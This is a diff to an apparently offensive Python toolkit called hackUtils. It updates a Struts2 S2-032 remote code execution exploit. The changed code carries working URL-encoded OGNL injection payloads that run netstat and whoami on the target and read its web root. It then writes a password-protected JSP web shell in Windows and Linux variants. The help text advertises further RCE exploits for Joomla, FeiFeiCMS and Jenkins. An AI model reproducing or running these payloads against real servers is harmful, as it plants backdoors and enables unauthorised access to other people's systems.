@@ -755,30 +755,35 @@ def checkS2032(url):
     url = url.strip()
     if '?' in url:
         url = url.split('?')[0]
-    #reg = 'http[s]*://.*/$'
-    #m = re.match(reg,url)
-    #if not m:
-    #    url = url + "/"
 
     poc = url+"?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command[0]%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char[51020]%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=netstat"
+    poc_root_path = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8"
+    poc_whoami = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=A&ppp=%20&encoding=UTF-8"
 		
     shellname="nimabi.jsp"
-    shellpwd="pwd"
-    exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj="+shellname+"&content=gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.getParameter%28%22"+shellpwd+"%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22l%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
+    shellpwd="f"
+    shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+
     try:
         result = exploitS2032(poc)
         if "Local Address" in result:
             try:
-            	shell_path = exploitS2032(exp).strip()
-            	reg = '(http[s]*://[^/]*/?).*$'
-            	m = re.search(reg,url)
-            	if m:
-            	    url_path=m.group(1)
-            	    shell_file = url_path+shellname
+            	root_path = exploitS2032(poc_root_path).strip()
+            	whoami = exploitS2032(poc_whoami).strip()
+            	if ":" in root_path:
+            		system = "Windows"
+            		exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_win+"&encoding=UTF-8&pp=%2f"
+            	else:
+            		system = "Linux"
+            		exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_linux+"&encoding=UTF-8&pp=%2f"
+            	shell_path = exploitS2032(exp).strip() + ' (password: '+shellpwd+')'
             except Exception, e:
-            	shell_path = "failed to getshell"
-            	shell_file = "failed to getshell"
-            vuls='[+] vuls found! url: '+url+', shell_path: '+ shell_path +', shell_file: '+shell_file
+            	root_path = "unknown"
+            	whoami = "unknown"
+            	shell_path = "unknown"
+            	system = "unknown"
+            vuls='[+] vuls found! url: '+url+', system: '+ system +', whoami: '+whoami+', root_path: '+root_path+', shell_path: '+shell_path
             logfile(vuls,'s2032_rce.txt')
             print vuls
         else:
@@ -792,7 +797,7 @@ def exploitS2032(exp):
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.1.0           |"
+    print "|  hackUtils v0.1.1           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
@@ -808,7 +813,7 @@ def myhelp():
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
     print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
     print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
-    print "  -s url|file, --s2032=url|file                       Exploit Remote Code Execution for Struts2 (S2-032) (Password: pwd)"
+    print "  -s url|file, --s2032=url|file                       Exploit Remote Code Execution for Struts2 (S2-032)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
